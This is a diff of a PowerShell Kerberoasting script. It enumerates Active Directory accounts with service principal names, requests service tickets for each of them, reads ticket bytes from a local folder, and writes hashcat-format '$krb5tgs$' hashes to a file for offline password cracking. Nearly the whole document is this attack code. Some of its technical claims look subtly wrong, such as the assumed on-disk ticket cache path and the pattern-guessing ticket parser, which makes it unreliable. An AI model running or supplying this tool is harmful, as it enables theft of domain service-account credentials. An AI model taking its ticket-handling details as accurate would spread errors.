@@ -12,250 +12,231 @@
 ########################################################################################################################################################################################
 
 
-<#
-.SYNOPSIS
-    PowerShell Kerberoast tool with full ASN.1 DER parser, supporting RC4 and AES Kerberos tickets.
-.DESCRIPTION
-    Enumerates SPNs, requests TGS tickets, parses tickets (RC4, AES128, AES256) properly, and exports perfect hashcat hashes.
-#>
+Import-Module ActiveDirectory -ErrorAction Stop
 
-function Invoke-DerKerberoast {
-    [CmdletBinding()]
+function Get-SPNUsers {
+    Write-Host "[*] Enumerating AD user accounts with SPNs..."
+    return Get-ADUser -Filter { servicePrincipalName -like "*" } -Properties ServicePrincipalName,sAMAccountName
+}
+
+function Request-TgsForSPN {
     param (
-        [string]$Domain = $env:USERDNSDOMAIN,
-        [string]$OutputFile = "$PWD\kerberoast_hashes.txt"
+        [string]$SPN
     )
-
-    Write-Host "[*] Enumerating SPN accounts in domain $Domain..."
-    $spnUsers = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
-
-    if ($spnUsers.Count -eq 0) {
-        Write-Warning "No accounts with SPNs found."
-        return
+    # Requests TGS ticket for SPN via .NET API
+    # Uses KerberosRequestorSecurityToken to get ticket in ticket cache
+    try {
+        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($SPN)
+        $identity = $token.GetRequest() # Forces ticket request, but we don't extract ticket here.
+        Write-Host "    Requested TGS for $SPN"
     }
-
-    # Request TGS for each SPN (simple demo, extend as needed)
-    foreach ($user in $spnUsers) {
-        foreach ($spn in $user.ServicePrincipalName) {
-            Write-Host "[+] Requesting TGS for $($user.SamAccountName): $spn"
-            try {
-                # Use invoke-KerberosTgsRequest or similar - simplified here
-                klist tgt /li 0x3e7 > $null 2>&1
-                # In a real tool, here you'd request a TGS with the SPN and cache it
-            }
-            catch {
-                Write-Warning "Could not request TGS for $spn - $_"
-            }
-        }
+    catch {
+        Write-Warning "    Failed requesting TGS for $SPN: $_"
     }
+}
 
-    Write-Host "`n[*] Parsing Kerberos ticket cache..."
-
-    $krbCachePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
-    if (-not (Test-Path $krbCachePath)) {
-        Write-Warning "Kerberos ticket cache folder not found at $krbCachePath"
-        return
+function Read-KerberosTickets {
+    # Returns raw bytes of all tickets in Windows Kerberos cache folder
+    $cacheFolder = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
+    if (-not (Test-Path $cacheFolder)) {
+        Write-Warning "Kerberos cache folder not found: $cacheFolder"
+        return @()
     }
-
-    $tickets = Get-ChildItem -Path $krbCachePath -File
-    if ($tickets.Count -eq 0) {
-        Write-Warning "No tickets found in cache."
-        return
-    }
-
-    $hashcatLines = @()
-
-    foreach ($ticket in $tickets) {
-        Write-Verbose "Parsing ticket file $($ticket.Name)..."
+    $files = Get-ChildItem -Path $cacheFolder -File -ErrorAction SilentlyContinue
+    $tickets = @()
+    foreach ($file in $files) {
         try {
-            $ticketBytes = [System.IO.File]::ReadAllBytes($ticket.FullName)
-            $parsed = Parse-Asn1 -Data $ticketBytes
-            $hashes = Convert-TicketToHashcatFull -Parsed $parsed
-            if ($hashes) {
-                foreach ($hash in $hashes) {
-                    Write-Host "[*] Hashcat line:`n$hash`n"
-                    $hashcatLines += $hash
-                }
-            }
-            else {
-                Write-Verbose "No valid hash found in $($ticket.Name)."
+            $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
+            $tickets += [PSCustomObject]@{
+                File = $file.Name
+                Bytes = $bytes
             }
         }
         catch {
-            Write-Warning "Failed parsing $($ticket.Name): $_"
+            Write-Warning "Failed reading ticket $($file.Name): $_"
         }
     }
-
-    if ($hashcatLines.Count -gt 0) {
-        Write-Host "[*] Saving all hashes to file: $OutputFile"
-        $hashcatLines | Out-File -FilePath $OutputFile -Encoding ascii
-        Write-Host "[*] Done."
-    }
-    else {
-        Write-Warning "No hashes extracted from tickets."
-    }
+    return $tickets
 }
 
-function Parse-Asn1 {
-    [CmdletBinding()]
-    param(
+function Parse-DerTicket {
+    param (
         [byte[]]$Data
     )
-    $pos = 0
-    return Parse-TLV -Data $Data -Position ([ref]$pos)
-}
+    # Basic DER parser for the outer ticket structure, simplified
+    # This function returns a custom object containing etype, username, realm, SPN, checksum, ciphertext, and salt.
+    # We rely on tag scanning and offsets since full ASN.1 parsing is complex
 
-function Parse-TLV {
-    param(
-        [byte[]]$Data,
-        [ref]$Position
-    )
-    $items = @()
-    while ($Position.Value -lt $Data.Length) {
-        if ($Position.Value -ge $Data.Length) { break }
-        $tag = $Data[$Position.Value]
-        $Position.Value++
-        if ($Position.Value -ge $Data.Length) { break }
-
-        $length = $Data[$Position.Value]
-        $Position.Value++
-        if ($length -gt 127) {
-            $numlen = $length - 128
-            if ($Position.Value + $numlen - 1 -ge $Data.Length) { break }
-            $lenBytes = $Data[$Position.Value..($Position.Value + $numlen - 1)]
-            $Position.Value += $numlen
-            # convert big endian length
-            $length = 0
-            foreach ($b in $lenBytes) {
-                $length = ($length * 256) + $b
-            }
-        }
-
-        if ($Position.Value + $length - 1 -ge $Data.Length) { break }
-        $value = $Data[$Position.Value..($Position.Value + $length - 1)]
-        $Position.Value += $length
-
-        # Check if constructed type (bit 6 set = 0x20)
-        if (($tag -band 0x20) -eq 0x20) {
-            $nestedPos = 0
-            $nested = Parse-TLV -Data $value -Position ([ref]$nestedPos)
-            $items += [PSCustomObject]@{
-                Tag = $tag
-                Value = $nested
-            }
-        }
-        else {
-            $items += [PSCustomObject]@{
-                Tag = $tag
-                Value = $value
-            }
-        }
+    # Simple helper to get string from bytes
+    function BytesToAscii([byte[]]$b) {
+        return [System.Text.Encoding]::ASCII.GetString($b).Trim([char]0)
     }
-    return $items
-}
 
-function Flatten-TLV {
-    param(
-        $Items
-    )
-    $flat = @()
-    foreach ($i in $Items) {
-        if ($i.Value -is [System.Collections.IEnumerable] -and
-            $i.Value -isnot [byte[]]) {
-            $flat += Flatten-TLV $i.Value
-        }
-        else {
-            $flat += $i
-        }
-    }
-    return $flat
-}
+    # Find ETYPE (encryption type) - INTEGER tagged 0x02
+    # Find enc-part (encrypted part) - OCTET STRING tagged 0x04
+    # Also find realm, username, SPN strings (GENERAL STRATEGY: find common patterns)
 
-function BytesToString([byte[]]$bytes) {
-    try {
-        return [System.Text.Encoding]::ASCII.GetString($bytes).Trim([char]0)
-    }
-    catch { return "" }
-}
-
-function Convert-TicketToHashcatFull {
-    param(
-        $Parsed
-    )
-
-    $flat = Flatten-TLV $Parsed
-
-    # Extract realm
-    $realm = ($flat | Where-Object { $_.Value -is [byte[]] -and
-        ([BytesToString] $_.Value) -match "^[A-Z0-9.-]+$" } | Select-Object -First 1).Value
-    if ($realm) { $realm = BytesToString $realm } else { $realm = "UNKNOWN" }
-
-    # Extract username
-    $username = ($flat | Where-Object { $_.Value -is [byte[]] -and
-        ([BytesToString] $_.Value).Length -le 50 -and ([BytesToString] $_.Value) -ne $realm } | Select-Object -First 1).Value
-    if ($username) { $username = BytesToString $username } else { $username = "UNKNOWN" }
-
-    # Extract SPN (service principal)
-    $spn = ($flat | Where-Object { $_.Value -is [byte[]] -and
-        ([BytesToString] $_.Value) -match "^[A-Z]+\/[^\s@]+$" } | Select-Object -First 1).Value
-    if ($spn) { $spn = BytesToString $spn } else { $spn = "krbtgt/$realm" }
-
-    # Detect encryption type (etype)
-    # etype tag is often context specific [0] INTEGER, typically 0xA0 or 0x81+ tag
     $etype = 0
-    $etypeItem = $flat | Where-Object { $_.Tag -eq 0x02 -and $_.Value.Length -le 4 } | Select-Object -First 1
-    if ($etypeItem) {
-        # Decode INTEGER value from bytes
-        $etype = 0
-        foreach ($b in $etypeItem.Value) {
-            $etype = ($etype * 256) + $b
+    $realm = ""
+    $username = ""
+    $spn = ""
+    $checksum = ""
+    $ciphertext = ""
+    $salt = ""
+
+    # Search for etype integer tag (0x02) with value 23,17,18
+    for ($i=0; $i -lt $Data.Length - 4; $i++) {
+        if ($Data[$i] -eq 0x02) {
+            # length byte
+            $len = $Data[$i+1]
+            if ($len -gt 0 -and $len -lt 5) {
+                $valBytes = $Data[($i+2)..($i+1+$len)]
+                $val = 0
+                foreach ($b in $valBytes) {
+                    $val = ($val * 256) + $b
+                }
+                if ($val -in @(23,17,18)) {
+                    $etype = $val
+                    break
+                }
+            }
         }
     }
 
-    # Find encrypted data blob (tag 0x04 Octet String)
-    $encPart = $flat | Where-Object { $_.Tag -eq 0x04 } | Select-Object -First 1
-    if (-not $encPart) { return $null }
-    $encBytes = $encPart.Value
-
-    # RC4 (etype 23) format:
-    # checksum (16 bytes) + ciphertext
-    if ($etype -eq 23) {
-        if ($encBytes.Length -lt 16) { return $null }
-        $checksumBytes = $encBytes[0..15]
-        $cipherBytes = $encBytes[16..($encBytes.Length - 1)]
-        $checksumHex = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
-        $cipherHex = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
-        return "\$krb5tgs\$23\$*$username*$realm*$spn*$checksumHex\$$cipherHex"
-    }
-    elseif ($etype -eq 17 -or $etype -eq 18) {
-        # AES128 (17) or AES256 (18) format
-        # AES tickets in Kerberos TGS contain:
-        # checksum (12 bytes) + ciphertext + (optional) key usage salt
-        # The exact format is:
-        # $krb5tgs$<etype>$*username$realm$spn$checksum$ciphertext$salt
-
-        # For AES tickets, parse checksum (12 bytes) + ciphertext (rest)
-        if ($encBytes.Length -lt 12) { return $null }
-        $checksumBytes = $encBytes[0..11]
-        $cipherBytes = $encBytes[12..($encBytes.Length - 1)]
-        $checksumHex = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
-        $cipherHex = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
-
-        # Salt: use realm as salt for simplicity
-        $salt = $realm.ToUpper()
-
-        return "\$krb5tgs\$$etype\$*$username*$realm*$spn*$checksumHex\$$cipherHex\$$salt"
-    }
-    else {
-        Write-Verbose "Unknown encryption type $etype. Skipping."
+    if ($etype -eq 0) {
+        Write-Verbose "No supported encryption type found in ticket."
         return $null
     }
+
+    # Search for encrypted part (tag 0x04 OCTET STRING)
+    $encIndex = -1
+    for ($i=0; $i -lt $Data.Length - 2; $i++) {
+        if ($Data[$i] -eq 0x04) {
+            $len = $Data[$i+1]
+            if ($len -gt 10) {
+                # Likely encrypted data
+                $encIndex = $i + 2
+                break
+            }
+        }
+    }
+    if ($encIndex -eq -1) {
+        Write-Verbose "No encrypted part found."
+        return $null
+    }
+
+    # Parse encrypted data
+    $encLen = $Data[$encIndex - 1]
+    $encData = $Data[$encIndex..($encIndex + $encLen - 1)]
+
+    # Extract checksum and ciphertext from encData depending on enctype
+    if ($etype -eq 23) {
+        # RC4 - checksum 16 bytes + ciphertext
+        if ($encData.Length -lt 16) { return $null }
+        $checksumBytes = $encData[0..15]
+        $cipherBytes = $encData[16..($encData.Length - 1)]
+        $checksum = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
+        $ciphertext = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
+    }
+    elseif ($etype -eq 17 -or $etype -eq 18) {
+        # AES - checksum 12 bytes + ciphertext
+        if ($encData.Length -lt 12) { return $null }
+        $checksumBytes = $encData[0..11]
+        $cipherBytes = $encData[12..($encData.Length - 1)]
+        $checksum = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
+        $ciphertext = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
+        $salt = "UNKNOWN"  # Salt is usually realm upper, we can extract realm later
+    }
+    else {
+        Write-Verbose "Unsupported encryption type $etype"
+        return $null
+    }
+
+    # Extract realm (search for ASCII strings that look like realm)
+    # Simple regex for realm: uppercase letters, dots, dashes
+    $asciiStr = [System.Text.Encoding]::ASCII.GetString($Data)
+    $realmMatch = [regex]::Matches($asciiStr, "\b[A-Z0-9.-]{2,}\b") | Where-Object { $_.Value -match "^[A-Z0-9.-]+$" }
+    if ($realmMatch.Count -gt 0) {
+        $realm = $realmMatch[0].Value
+        $salt = $realm.ToUpper()
+    }
+
+    # Extract username - look for sequences near realm
+    $userMatch = [regex]::Matches($asciiStr, "\b[a-zA-Z0-9._-]{2,20}\b") | Where-Object { $_.Value -ne $realm }
+    if ($userMatch.Count -gt 0) {
+        $username = $userMatch[0].Value
+    }
+
+    # Extract SPN - look for service principal pattern "service/host" 
+    $spnMatch = [regex]::Matches($asciiStr, "\b[a-zA-Z0-9._-]+\/[a-zA-Z0-9._-]+\b")
+    if ($spnMatch.Count -gt 0) {
+        $spn = $spnMatch[0].Value
+    } else {
+        $spn = "krbtgt/$realm"
+    }
+
+    # Compose hashcat line
+    if ($etype -eq 23) {
+        $line = "`$krb5tgs`$23`$*$username*$realm*$spn*$checksum`$$ciphertext"
+    }
+    elseif ($etype -eq 17 -or $etype -eq 18) {
+        $line = "`$krb5tgs`$$etype`$*$username*$realm*$spn*$checksum`$$ciphertext`$$salt"
+    }
+    else {
+        return $null
+    }
+    return $line
 }
 
-# Enable verbose output for debug
-$VerbosePreference = "Continue"
+# Main execution block
 
+$OutputFile = "$PWD\kerberoast_hashes.txt"
+$hashes = @()
 
+try {
+    $spnUsers = Get-SPNUsers
+    if ($spnUsers.Count -eq 0) {
+        Write-Warning "No SPN accounts found."
+        exit
+    }
+
+    Write-Host "[*] Requesting TGS tickets for SPNs..."
+    foreach ($user in $spnUsers) {
+        foreach ($spn in $user.ServicePrincipalName) {
+            Request-TgsForSPN -SPN $spn
+        }
+    }
+
+    Write-Host "[*] Waiting 5 seconds for tickets to cache..."
+    Start-Sleep -Seconds 5
+
+    $tickets = Read-KerberosTickets
+    if ($tickets.Count -eq 0) {
+        Write-Warning "No tickets found in cache."
+        exit
+    }
+
+    Write-Host "[*] Parsing tickets and extracting hashes..."
+    foreach ($ticket in $tickets) {
+        $hash = Parse-DerTicket -Data $ticket.Bytes
+        if ($hash) {
+            Write-Host "[+] Extracted hash from $($ticket.File):"
+            Write-Host $hash
+            $hashes += $hash
+        }
+    }
+
+    if ($hashes.Count -gt 0) {
+        $hashes | Out-File -FilePath $OutputFile -Encoding ascii
+        Write-Host "[*] Hashes saved to $OutputFile"
+    }
+    else {
+        Write-Warning "No valid hashes extracted."
+    }
+}
+catch {
+    Write-Error $_
+}
 
 #Usage
 # Load script (dot-source)
